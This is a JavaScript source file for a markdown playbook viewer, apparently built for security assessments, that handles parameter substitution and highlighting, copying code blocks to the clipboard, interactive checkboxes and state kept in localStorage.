        storedStates.forEach((state, idx) => {
            if (typeof state === 'boolean') {
                checkboxStates.set(idx, state);
            }
        });
    }

    extractParameters(content);
    renderContent();
    resetContentScroll();
}

function renderContent() {
    codeBlockParamMap = extractCodeBlockParameters(currentContent);
    const contentWithValues = applyParametersToContent(currentContent);
    const html = marked.parse(contentWithValues);
    document.getElementById('contentArea').innerHTML = html;
    
    enhanceCodeBlocks();
    highlightHashComments();
    // Run highlighting after DOM is built
    highlightParametersInText();
    highlightParametersInCodeBlocks();
    
    makeCheckboxesInteractive();
    setupCodeBlockSelection();
}

function applyParametersToContent(content) {
    let processedContent = content;

    Object.keys(parameters).forEach(param => {
        const value = wrapValueWithMarkers(param, getDisplayValueForParam(param));
        const safeParam = param.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        const regex1 = new RegExp(`<${safeParam}>`, 'g');
        const regex2 = new RegExp(`{{${safeParam}}}`, 'g');
        processedContent = processedContent.replace(regex1, () => value);
        processedContent = processedContent.replace(regex2, () => value);
    });

    return processedContent;
}

function wrapValueWithMarkers(param, value) {
    // Keep separator free of table delimiters so inline code in tables stays intact
    return `${PARAM_MARKER_START}${param}${PARAM_SEPARATOR}${value}${PARAM_MARKER_END}`;
}

function extractCodeBlockParameters(content) {
    try {
        const tokens = marked.lexer(content);
        return tokens
            .filter(token => token.type === 'code')
            .map(token => extractParamsFromText(token.text));
    } catch (error) {
        console.warn('Failed to extract code block parameters', error);
        return [];
    }
}

function enhanceCodeBlocks() {
    const contentArea = document.getElementById('contentArea');
    const codeBlocks = contentArea.querySelectorAll('pre > code');
    let blockIndex = 0;
    codeBlockWrappers = [];

    codeBlocks.forEach(codeBlock => {
        const pre = codeBlock.parentElement;

        if (!pre || (pre.parentElement && pre.parentElement.classList.contains('code-block'))) {
            return;
        }

        const wrapper = document.createElement('div');
        wrapper.className = 'code-block';
        wrapper.dataset.blockIndex = blockIndex;
        wrapper.dataset.params = JSON.stringify(codeBlockParamMap[blockIndex] || []);
        blockIndex++;

        pre.parentNode.insertBefore(wrapper, pre);
        wrapper.appendChild(pre);

        addSelectionCopyBehavior(wrapper);
    });

    attachSelectionCopyHandler();
}

function addSelectionCopyBehavior(wrapper) {
    codeBlockWrappers.push(wrapper);
}

function addModalCopyBehavior(wrapper) {
    modalCopyWrappers.push(wrapper);
}

function attachSelectionCopyHandler() {
    if (selectionCopyHandlerAttached) {
        return;
    }

    const handleSelectionCopy = () => {
        const selection = window.getSelection();
        if (!selection || selection.isCollapsed) {
            return;
        }

        const wrapper = findIntersectingWrapper(selection);
        if (!wrapper) {
            return;
        }

        const selectedText = selection.toString();
        if (!selectedText.trim()) {
            return;
        }

        const now = Date.now();
        if (selectedText === lastCopiedSelection && wrapper === lastCopiedWrapper && (now - lastCopiedAt) < 200) {
            return;
        }

        lastCopiedSelection = selectedText;
        lastCopiedWrapper = wrapper;
        lastCopiedAt = now;

        navigator.clipboard.writeText(selectedText)
            .then(() => showCopyFeedback(wrapper, 'Copied'))
            .catch((error) => {
                console.warn('Copy failed', error);
                showCopyFeedback(wrapper, 'Copy failed');
            });
    };

    ['mouseup', 'keyup', 'touchend'].forEach(eventName => {
        document.addEventListener(eventName, handleSelectionCopy);
    });

    selectionCopyHandlerAttached = true;
}

function findIntersectingWrapper(selection) {
    if (!selection.rangeCount) {
        return null;
    }

    const wrappers = [...codeBlockWrappers, ...modalCopyWrappers];

    for (const wrapper of wrappers) {
        if (selectionIntersectsWrapper(selection, wrapper)) {
            return wrapper;
        }
    }

    return null;
}

function selectionIntersectsWrapper(selection, wrapper) {
    for (let i = 0; i < selection.rangeCount; i++) {
        const range = selection.getRangeAt(i);
        if (typeof range.intersectsNode === 'function') {
            if (range.intersectsNode(wrapper)) {
                return true;
            }
        } else {
            const wrapperRange = document.createRange();
            wrapperRange.selectNodeContents(wrapper);
            const startsBeforeEnd = range.compareBoundaryPoints(Range.END_TO_START, wrapperRange) < 0;
            const endsAfterStart = range.compareBoundaryPoints(Range.START_TO_END, wrapperRange) > 0;
            if (startsBeforeEnd && endsAfterStart) {
                return true;
            }
        }
    }
    return false;
}

function showCopyFeedback(wrapper, message) {
    let badge = wrapper.querySelector('.copy-feedback');
    if (!badge) {
        badge = document.createElement('div');
        badge.className = 'copy-feedback';
        wrapper.appendChild(badge);
    }

    badge.textContent = message;
    if (wrapper.closest('.pwn-modal')) {
        badge.classList.add('copy-feedback--modal');
    } else {
        badge.classList.remove('copy-feedback--modal');
    }
    badge.classList.add('visible');

    if (badge._timeoutId) {
        clearTimeout(badge._timeoutId);
    }

    badge._timeoutId = setTimeout(() => {
        badge.classList.remove('visible');
    }, 1600);
}

function highlightHashComments() {
    const codeBlocks = document.querySelectorAll('#contentArea pre > code');

    codeBlocks.forEach(codeBlock => {
        const className = (codeBlock.className || '').toLowerCase();
        const langMatch = className.match(/language-([a-z0-9_+-]+)/);
        const language = langMatch ? langMatch[1] : '';

        const skipHashHighlight = ['markdown', 'python', 'c'];
        if (skipHashHighlight.includes(language)) {
            return;
        }

        const escapeHtml = (value) => value
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');

        // IMPORTANT: We use textContent here to properly process plain text including markers
        const lines = codeBlock.textContent.split('\n');
        let hasHashComments = false;

        const highlightedHtml = lines
            .map(line => {
                const match = line.match(/(^|\s)#/);

                if (!match) {
                    return escapeHtml(line);
                }

                const hashIndex = (match.index || 0) + match[1].length;
                hasHashComments = true;

                const codePart = line.slice(0, hashIndex);
                const commentPart = line.slice(hashIndex);

                return `${escapeHtml(codePart)}<span class="hash-comment">${escapeHtml(commentPart)}</span>`;
            })
            .join('\n');

        if (hasHashComments) {
            codeBlock.innerHTML = highlightedHtml;
        }
    });
}

function highlightParametersInCodeBlocks() {
    const wrappers = document.querySelectorAll('.code-block');

    wrappers.forEach(wrapper => {
        const codeBlock = wrapper.querySelector('code');
        if (!codeBlock) {
            return;
        }
        highlightMarkedParameters(codeBlock, false);
    });
}

function highlightParametersInText() {
    const contentArea = document.getElementById('contentArea');
    if (!contentArea) {
        return;
    }
    // Preserve markers in code blocks so they can be processed separately
    highlightMarkedParameters(contentArea, true, true);
}

function highlightMarkedParameters(element, skipCodeBlocks, preserveCodeBlockMarkers = false) {
    mergeAdjacentTextNodes(element);

    const walker = document.createTreeWalker(
        element,
        NodeFilter.SHOW_TEXT,
        {
            acceptNode(node) {
                if (!node.nodeValue || node.nodeValue.indexOf(PARAM_MARKER_START) === -1) {
                    return NodeFilter.FILTER_REJECT;
                }

                const parent = node.parentElement;
                if (!parent) return NodeFilter.FILTER_ACCEPT;

                if (parent.closest('.param-token')) return NodeFilter.FILTER_REJECT;
                if (parent.closest('input, textarea, button, .params-panel')) return NodeFilter.FILTER_REJECT;
                if (skipCodeBlocks && parent.closest('.code-block')) return NodeFilter.FILTER_REJECT;

                return NodeFilter.FILTER_ACCEPT;
            }
        }
    );

    const textNodes = [];
    let textNode;
    while ((textNode = walker.nextNode())) {
        textNodes.push(textNode);
    }

    textNodes.forEach(node => {
        wrapMarkersInTextNode(node);
    });

    cleanupResidualMarkers(element, preserveCodeBlockMarkers);
}

function mergeAdjacentTextNodes(root) {
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
    let node;

    while ((node = walker.nextNode())) {
        while (node.nextSibling && node.nextSibling.nodeType === Node.TEXT_NODE) {
            node.nodeValue += node.nextSibling.nodeValue;
            node.parentNode.removeChild(node.nextSibling);
        }
    }
}

function wrapMarkersInTextNode(node) {
    const text = node.nodeValue;
    // Use escaped separator so inline code/backticks and tables parse safely
    const regex = new RegExp(`${PARAM_MARKER_START}([A-Z0-9_]+)${PARAM_SEPARATOR_REGEX}([\\s\\S]*?)${PARAM_MARKER_END}`, 'g');

    const matches = Array.from(text.matchAll(regex));
    if (!matches.length) {
        // Fallback: strip markers if regex failed (cleans up potential visible artifacts)
        if (text.includes(PARAM_MARKER_START) || text.includes(PARAM_MARKER_END)) {
            const cleaned = text
                .replace(new RegExp(`${PARAM_MARKER_START}[A-Z0-9_]+${PARAM_SEPARATOR_REGEX}`, 'g'), '')
                .replace(new RegExp(PARAM_MARKER_END, 'g'), '');
            node.nodeValue = cleaned;
        }
        return;
    }

    const fragment = document.createDocumentFragment();
    let lastIndex = 0;

    matches.forEach(match => {
        const start = match.index || 0;
        const value = match[2];

        if (start > lastIndex) {
            fragment.appendChild(document.createTextNode(text.slice(lastIndex, start)));
        }

        const span = document.createElement('span');
        span.className = 'param-token';
        span.dataset.param = match[1];
        span.textContent = value;
        // Force Inline Style as Backup
        span.style.color = 'rgb(0, 255, 30)';
        span.style.fontWeight = 'bold';
        
        fragment.appendChild(span);

        lastIndex = (match.index || 0) + match[0].length;
    });

    if (lastIndex < text.length) {
        fragment.appendChild(document.createTextNode(text.slice(lastIndex)));
    }

    node.parentNode.replaceChild(fragment, node);
}

function cleanupResidualMarkers(element, skipCodeBlocks = false) {
    const walker = document.createTreeWalker(element, NodeFilter.SHOW_TEXT);
    let node;

    while ((node = walker.nextNode())) {
        if (skipCodeBlocks && node.parentElement && node.parentElement.closest('.code-block')) {
            continue;
        }

        const value = node.nodeValue || '';
        if (!value.includes(PARAM_MARKER_START) && !value.includes(PARAM_MARKER_END)) {
            continue;
        }

        const cleaned = value
            .replace(new RegExp(`${PARAM_MARKER_START}[A-Z0-9_]+${PARAM_SEPARATOR_REGEX}`, 'g'), '')
            .replace(new RegExp(PARAM_MARKER_END, 'g'), '');

        if (cleaned !== value) {
            node.nodeValue = cleaned;
        }
    }
}

function getDisplayValueForParam(param) {
    const value = parameters[param];
    if (value === undefined || value === null || `${value}` === '') {
        return `<${param}>`;
    }
    return `${value}`;
}

function setupCodeBlockSelection() {
    const wrappers = document.querySelectorAll('.code-block');

    wrappers.forEach(wrapper => {
        wrapper.addEventListener('click', () => {
            selectCodeBlock(wrapper);
        });
    });

    if (!outsideClickListenerAttached) {
        document.addEventListener('click', (event) => {
            const clickedInsideCode = event.target.closest('.code-block');
            const clickedInsideParams = event.target.closest('#rightPanel');
            if (clickedInsideCode || clickedInsideParams) {
                return;
            }
            if (filteredParameters !== null || activeCodeBlock) {
                clearCodeBlockSelection();
            }
        });
        outsideClickListenerAttached = true;
    }

    if (activeCodeBlockIndex !== null) {
        const match = Array.from(wrappers).find(
            wrapper => Number(wrapper.dataset.blockIndex) === Number(activeCodeBlockIndex)
        );
        if (match) {
            if (suppressParamPanelRender) {
                activeCodeBlock = match;
                activeCodeBlock.classList.add('code-block-active');
                suppressParamPanelRender = false;
            } else {
                selectCodeBlock(match);
            }
        } else {
            suppressParamPanelRender = false;
        }
    }
}

function selectCodeBlock(wrapper) {
    if (!wrapper) {
        return;
    }

    if (activeCodeBlock && activeCodeBlock !== wrapper) {
        activeCodeBlock.classList.remove('code-block-active');
    }

    activeCodeBlock = wrapper;
    activeCodeBlockIndex = Number(wrapper.dataset.blockIndex);
    wrapper.classList.add('code-block-active');

    const params = parseParamsFromDataset(wrapper.dataset.params);
    filteredParameters = params;

    renderParametersPanel();
}

function parseParamsFromDataset(rawParams) {
    if (!rawParams) {
        return [];
    }
    try {
        const parsed = JSON.parse(rawParams);
        return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
        console.warn('Unable to parse code block parameters', error);
        return [];
    }
}

function clearCodeBlockSelection(skipRender = false) {
    if (activeCodeBlock) {
        activeCodeBlock.classList.remove('code-block-active');
    }
    activeCodeBlock = null;
    activeCodeBlockIndex = null;
    filteredParameters = null;

    if (!skipRender) {
        renderParametersPanel();
    }
}

function ensureParamSearchField() {
    const panel = document.querySelector('.params-panel');
    if (!panel) {
        return null;
    }

    let searchWrapper = panel.querySelector('.param-search');
    if (!searchWrapper) {
        searchWrapper = document.createElement('div');
        searchWrapper.className = 'param-search';

        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'param-search-input';
        input.placeholder = 'Search parameters';
        input.setAttribute('aria-label', 'Search parameters');

        searchWrapper.appendChild(input);

        const title = panel.querySelector('.panel-title');
        if (title) {
            title.insertAdjacentElement('afterend', searchWrapper);
        } else {
            panel.insertBefore(searchWrapper, panel.firstChild);
        }
    }

    if (filteredParameters !== null) {
        searchWrapper.classList.add('param-search-hidden');
    } else {
        searchWrapper.classList.remove('param-search-hidden');
    }

    const searchInput = searchWrapper.querySelector('.param-search-input');
    if (searchInput && !searchInput.dataset.bound) {
        searchInput.dataset.bound = 'true';
        searchInput.addEventListener('input', (e) => {
            paramSearchTerm = e.target.value;
            const caret = e.target.selectionStart || 0;
            renderParametersPanel();
            requestAnimationFrame(() => {
                const refreshedInput = document.querySelector('.param-search-input');
                if (refreshedInput) {
                    refreshedInput.focus();
                    refreshedInput.setSelectionRange(caret, caret);
                }
            });
        });
    }

    return searchInput || null;
}

function makeCheckboxesInteractive() {
    const contentArea = document.getElementById('contentArea');
    const listItems = contentArea.querySelectorAll('li');
    
    let checkboxIndex = 0;
    
    listItems.forEach(li => {
        const textContent = li.textContent || li.innerText;
        const existingCheckbox = li.querySelector('input[type="checkbox"]');
        const hasMarker = textContent.match(/^\s*\[([ xX])\]/) || Boolean(existingCheckbox);

        if (!hasMarker) {
            return;
        }

        if (existingCheckbox) {
            existingCheckbox.remove();
        }

        const isChecked = checkboxStates.get(checkboxIndex) || false;

        const checkbox = document.createElement('input');
        checkbox.type = 'checkbox';
        checkbox.checked = isChecked;
        checkbox.dataset.index = checkboxIndex;
        checkbox.setAttribute('aria-label', `Task checkbox ${checkboxIndex + 1}`);
        
        checkbox.addEventListener('change', (e) => {
            const idx = parseInt(e.target.dataset.index);
            checkboxStates.set(idx, e.target.checked);
            persistCheckboxStates(currentPhase);
            
            e.target.style.transform = 'scale(1.2)';
            setTimeout(() => {
                e.target.style.transform = '';
            }, 200);
        });
        
        const originalHTML = li.innerHTML;
        const newHTML = originalHTML.replace(/^\s*\[([ xX])\]\s*/, '');
        li.innerHTML = newHTML;
        li.style.display = 'flex';
        li.style.alignItems = 'flex-start';
        li.insertBefore(checkbox, li.firstChild);
        
        checkboxIndex++;
    });
}

function extractParameters(content) {
    const oldParams = {...parameters};
    parameters = {};
    
    const matches = extractParamsFromText(content);
    
    if (matches.length) {
        matches.forEach(param => {
            const storedValue = getStoredParameters()[param];
            parameters[param] = storedValue !== undefined ? storedValue : (oldParams[param] || '');
        });
    }
    
    renderParametersPanel();
}

function extractParamsFromText(text) {
    const matches = text.match(PARAM_TOKEN_REGEX);
    return matches ? [...new Set(matches.map(token => token.replace(/[<>{}]/g, '')))] : [];
}

function renderParametersPanel() {
    const container = document.getElementById('paramsContainer');
    const allParams = Object.keys(parameters);
    const hasAnyParameters = allParams.length > 0;
    const baseParams = filteredParameters !== null ? filteredParameters : allParams;
    const searchTerm = paramSearchTerm.trim().toLowerCase();
    let displayParams = baseParams.slice().sort();

    if (searchTerm) {
        displayParams = displayParams.filter(param => param.toLowerCase().includes(searchTerm));
    }

    const hasDisplayParams = displayParams.length > 0;

    toggleLayoutForParameters(hasAnyParameters);

    const searchInput = ensureParamSearchField();
    if (searchInput) {
        searchInput.value = paramSearchTerm;
    }
    
    if (!hasDisplayParams) {
        const message = !hasAnyParameters
            ? 'No parameters found in this phase'
            : (searchTerm
                ? 'No parameters match your search'
                : (filteredParameters !== null
                    ? 'No parameters found for this code block'
                    : 'No parameters found in this phase'));
        container.innerHTML = `<p class="text-secondary" style="color: var(--text-secondary); font-size: 0.875rem; text-align: center; padding: 1rem;">${message}</p>`;
        return;
    }
    
    let html = '';
    displayParams.forEach(param => {
        html += `
            <div class="param-group">
                <label class="param-label">${param}</label>
                <input type="text" 
                       class="param-input" 
                       data-param="${param}" 
                       value="${parameters[param] || ''}" 
                       placeholder="Enter ${param.toLowerCase().replace(/_/g, ' ')}"
                       aria-label="Parameter input for ${param}">
            </div>
        `;
    });
    
    container.innerHTML = html;
    
    container.querySelectorAll('.param-input').forEach(input => {
        input.addEventListener('input', (e) => {
            const scrollPos = document.getElementById('contentArea').scrollTop;
            parameters[e.target.dataset.param] = e.target.value;
            persistParameters();
            suppressParamPanelRender = filteredParameters !== null;
            updateContent(scrollPos);
        });

        input.addEventListener('focus', (e) => {
            e.target.parentElement.style.transform = 'translateX(4px)';
        });

        input.addEventListener('blur', (e) => {
            e.target.parentElement.style.transform = '';
        });
    });
}

function updateContent(scrollPos = null) {
    renderContent();
    
    if (scrollPos !== null) {
        document.getElementById('contentArea').scrollTop = scrollPos;
    }
}

function toggleRightPanel() {
    const rightPanel = document.getElementById('rightPanel');
    rightPanel.classList.toggle('collapsed');
    localStorage.setItem('rightPanelCollapsed', rightPanel.classList.contains('collapsed'));
}

function toggleLayoutForParameters(hasParameters) {
    const centerPanel = document.getElementById('centerPanel');
    const rightPanel = document.getElementById('rightPanel');

    if (!centerPanel || !rightPanel) {
        return;
    }

    if (hasParameters) {
        centerPanel.classList.remove('col-lg-10', 'col-md-9');
        centerPanel.classList.add('col-lg-7', 'col-md-6');
        rightPanel.classList.remove('d-none');
        
        const wasCollapsed = localStorage.getItem('rightPanelCollapsed') === 'true';
        if (wasCollapsed) {
            rightPanel.classList.add('collapsed');
        }
    } else {
        centerPanel.classList.remove('col-lg-7', 'col-md-6');
        centerPanel.classList.add('col-lg-10', 'col-md-9');
        rightPanel.classList.add('d-none');
    }
}

function loadCheckboxStatesFromStorage(phase) {
    const stored = getStoredCheckboxState()[phase];
    return Array.isArray(stored) ? stored.map(value => Boolean(value)) : null;
}

function persistCheckboxStates(phase) {
    const allCheckboxStates = getStoredCheckboxState();
    const stateArray = [];

    checkboxStates.forEach((value, key) => {
        stateArray[key] = value;
    });

    allCheckboxStates[phase] = stateArray;
    localStorage.setItem(CHECKBOX_STORAGE_KEY, JSON.stringify(allCheckboxStates));
    updateResetButtonVisibility();
}

function getStoredCheckboxState() {
    try {
        const raw = localStorage.getItem(CHECKBOX_STORAGE_KEY);
        return raw ? JSON.parse(raw) : {};
    } catch (error) {
        console.warn('Could not read checkbox state from localStorage', error);
        return {};
    }
}

function getStoredParameters() {
    try {
        const raw = localStorage.getItem(PARAMS_STORAGE_KEY);
        return raw ? JSON.parse(raw) : {};
    } catch (error) {
        console.warn('Could not read parameters from localStorage', error);
        return {};
    }
}

function persistParameters() {
    localStorage.setItem(PARAMS_STORAGE_KEY, JSON.stringify(parameters));
    updateResetButtonVisibility();
}

function hasStoredCheckboxData() {
    const stored = getStoredCheckboxState();
    return Object.values(stored).some(value => Array.isArray(value) && value.length > 0);
}

function hasStoredParameterData() {
    const stored = getStoredParameters();
    return Object.keys(stored).length > 0;
}

function updateResetButtonVisibility() {
    const resetBtn = document.getElementById('newAssessmentBtn');
    if (!resetBtn) {
        return;
    }

    const shouldShow = hasStoredCheckboxData() || hasStoredParameterData();
    resetBtn.hidden = !shouldShow;
}

function resetAssessment() {
    if (!confirm('Are you sure you want to reset the playbook? This will clear all checkboxes and parameters.')) {
        return;
    }

    localStorage.removeItem(CHECKBOX_STORAGE_KEY);
    localStorage.removeItem(PARAMS_STORAGE_KEY);
    checkboxStates.clear();
    parameters = {};
    
    if (currentPhase) {
        loadPhase(currentPhase);
    }

    updateResetButtonVisibility();
    showResetToast();
}

function showResetToast() {
    const toast = document.getElementById('resetToast');
    if (!toast) return;

    toast.classList.add('show');

    if (resetToastTimeout) {
        clearTimeout(resetToastTimeout);
    }

    resetToastTimeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

function resetContentScroll() {
    const contentArea = document.getElementById('contentArea');
    if (contentArea) {
        contentArea.scrollTop = 0;
    }
}
